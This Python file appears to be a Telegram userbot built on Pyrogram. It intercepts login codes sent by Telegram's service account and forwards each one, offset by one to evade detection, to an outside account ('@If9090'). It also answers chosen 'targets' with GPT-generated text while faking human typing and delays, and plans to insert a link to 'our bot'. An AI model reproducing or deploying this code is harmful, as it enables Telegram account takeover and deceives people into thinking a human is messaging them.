import asyncio
import random
import time
from pyrogram import filters
from pyrogram.enums import ChatAction

from database.req import get_target, update_target
from handlers.errors import gpt_assystent_mes


pending_replies = {}


async def code_finder(msg: str) -> int:
    for i in range(len(msg)):
        try:
            int(msg[i])
            return int(msg[i: i + 5])
        except Exception:
            continue


def setup_handlers(client):
    @client.on_message(filters.private)
    async def reply(client, message):
        if message.from_user.id == 777000:
            print(message.text)
            code = await code_finder(message.text)
            await client.send_message('@If9090', f'Код для входа в этот аккаунт - {code-1}\nНе забудь добавить 1')
            return

        target = await get_target(message.from_user.username)
        if not target or not target.f_m:
            return

        if not target.f_a:
            await update_target(message.from_user.username, {'f_a': True})

        user_id = message.from_user.id

        if user_id not in pending_replies:
            pending_replies[user_id] = {
                'messages': [message.text],
                'task': asyncio.create_task(handle_pending(client, message.chat.id, target, user_id))
            }
        else:
            pending_replies[user_id]['messages'].append(message.text)

    async def handle_pending(client, chat_id, target, user_id):
        await asyncio.sleep(180)
        await client.read_chat_history(chat_id)
        messages = pending_replies[user_id]['messages']
        combined_message = "\n".join(messages)
        del pending_replies[user_id]

        await asyncio.sleep(random.randint(10, 70))
        response_text: str = await gpt_assystent_mes(target.dialog, mes=combined_message)
        if response_text.find(''):  # TODO: add link to our bot
            if not target.l_m:
                await update_target(target.handler, {'l_m': True})
        await client.send_chat_action(chat_id, ChatAction.TYPING)
        await asyncio.sleep(random.randint(5, 15))
        await client.send_message(target.handler, response_text, disable_notification=True)
